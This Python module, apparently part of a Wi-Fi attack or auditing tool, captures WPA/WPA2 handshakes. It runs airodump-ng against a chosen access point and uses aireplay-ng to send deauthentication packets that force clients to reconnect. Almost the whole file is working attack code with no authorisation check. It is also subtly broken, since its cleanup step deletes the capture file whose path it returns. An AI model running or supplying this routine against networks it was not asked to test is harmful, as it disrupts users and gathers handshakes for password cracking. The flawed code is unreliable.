# src/core/capture_manager.py
"""
Provides core functionalities for capturing wireless traffic,
including WPA/WPA2 handshakes using airodump-ng and aireplay-ng.
"""

import subprocess
import time
import os
import tempfile  # <--- CRITICAL FIX: Import tempfile
from typing import Optional

from core.logger import logger
from helpers import shelltools 
# from core.state_management.state import AppState # Not directly needed in CaptureManager


class CaptureManager:
    """
    Encapsulates operations related to capturing network traffic.
    """
    def __init__(self):
        self.logger = logger

    def capture_handshake(self, 
                          monitor_interface: str, 
                          target_bssid: str, 
                          target_channel: str, 
                          output_file_prefix: str,
                          capture_time_seconds: int = 30,
                          deauth_count: int = 5,
                          auto_mode: bool = False
                         ) -> Optional[str]:
        """
        Attempts to capture a WPA/WPA2 handshake for a given target.

        Args:
            monitor_interface (str): The interface name in monitor mode (e.g., 'wlan0mon').
            target_bssid (str): The BSSID of the target access point.
            target_channel (str): The channel of the target access point.
            output_file_prefix (str): Prefix for the .cap file (e.g., 'handshake_AP1').
            capture_time_seconds (int): How long to attempt capturing the handshake.
            deauth_count (int): Number of deauthentication packets to send to force handshake.
            auto_mode (bool): If True, will wait for `capture_time_seconds` automatically.
                              If False, will inform user to press Ctrl+C to stop early.

        Returns:
            Optional[str]: Full path to the captured .cap file if successful, None otherwise.
        """
        self.logger.info(f"[CaptureManager] Starting handshake capture for BSSID {target_bssid} on channel {target_channel} via {monitor_interface}...")

        # Construct actual output file paths for airodump-ng (it adds -01.cap etc.)
        base_output_path = os.path.join(tempfile.gettempdir(), output_file_prefix) # Use temp dir for output
        final_cap_file_path = f"{base_output_path}-01.cap" # airodump-ng's default suffix
        
        # Files airodump-ng will create, for cleanup
        airodump_files_to_clean = [
            f"{base_output_path}-01.cap", 
            f"{base_output_path}-01.csv", # airodump may write a csv alongside cap
            f"{base_output_path}-01.kismet.csv", 
            f"{base_output_path}-01.kismet.netxml", 
            f"{base_output_path}-01.log.csv"
        ]
        # Clean up any leftover files from previous runs with the same prefix
        for f_to_clean in airodump_files_to_clean:
            if os.path.exists(f_to_clean):
                try:
                    os.remove(f_to_clean)
                    self.logger.debug(f"Removed leftover temp file: {f_to_clean}")
                except OSError as e_remove:
                    self.logger.warning(f"Could not remove leftover temp file {f_to_clean}: {e_remove}")


        dump_proc: Optional[subprocess.Popen] = None
        try:
            # Start airodump-ng in the background to capture traffic
            airodump_cmd = [
                "airodump-ng",
                "--bssid", target_bssid,
                "--channel", target_channel, # Channel is a string
                "--write", base_output_path,
                monitor_interface
            ]
            self.logger.debug(f"[CaptureManager] Executing airodump-ng: {' '.join(airodump_cmd)}")
            dump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)

            # Wait briefly for airodump-ng to start capturing
            time.sleep(2) 

            # Send deauthentication packets to force a handshake
            self.logger.info(f"[CaptureManager] Sending {deauth_count} deauth packets to {target_bssid}...")
            aireplay_cmd = [
                "aireplay-ng", 
                "--deauth", str(deauth_count), 
                "-a", target_bssid, 
                monitor_interface
            ]
            self.logger.debug(f"[CaptureManager] Executing aireplay-ng: {' '.join(aireplay_cmd)}")
            shelltools.run_command(aireplay_cmd, require_root=True, check=False) # check=False to avoid exception on non-zero exit

            # Wait for handshake capture
            if auto_mode:
                self.logger.info(f"[CaptureManager] Waiting for handshake capture ({capture_time_seconds}s) in auto mode...")
                time.sleep(capture_time_seconds)
            else:
                self.logger.info(f"[CaptureManager] Waiting for handshake capture ({capture_time_seconds}s)... Press Ctrl+C to stop early.")
                try:
                    # Polling sleep for responsiveness to Ctrl+C
                    for _ in range(capture_time_seconds):
                        time.sleep(1)
                except KeyboardInterrupt:
                    self.logger.info("[CaptureManager] Capture interrupted by user.")

            self.logger.info("[CaptureManager] Stopping airodump-ng capture...")
            if dump_proc and dump_proc.poll() is None: # If airodump-ng is still running
                dump_proc.terminate()
                try:
                    dump_proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.logger.warning("[CaptureManager] airodump-ng did not terminate gracefully, killing.")
                    dump_proc.kill()
                    dump_proc.wait()
            self.logger.debug("[CaptureManager] Airodump-ng process finished.")

            # Check for the captured handshake file
            if os.path.exists(final_cap_file_path) and os.path.getsize(final_cap_file_path) > 0:
                self.logger.info(f"[✓] Handshake captured: {final_cap_file_path}")
                return final_cap_file_path
            else:
                self.logger.error(f"[✘] Handshake capture failed. No valid .cap file found at {final_cap_file_path}.")
                return None

        except FileNotFoundError as fnfe:
            self.logger.error(f"[CaptureManager] Command not found (airodump-ng/aireplay-ng): {fnfe}. Please ensure it's installed and in your PATH.")
            return None
        except Exception as e:
            self.logger.error(f"[CaptureManager] An error occurred during handshake capture: {e}")
            return None
        finally:
            # Ensure airodump-ng process is terminated, even if other errors occur
            if dump_proc and dump_proc.poll() is None:
                self.logger.warning("[CaptureManager] airodump-ng process was still running in finally block, terminating.")
                dump_proc.terminate()
                try:
                    dump_proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    dump_proc.kill()
            
            # Clean up all potential airodump files
            for f_to_clean in airodump_files_to_clean:
                if os.path.exists(f_to_clean):
                    try:
                        os.remove(f_to_clean)
                        self.logger.debug(f"[CaptureManager] Removed temp file: {f_to_clean}")
                    except OSError as e_remove:
                        self.logger.warning(f"[CaptureManager] Could not remove temp file {f_to_clean}: {e_remove}")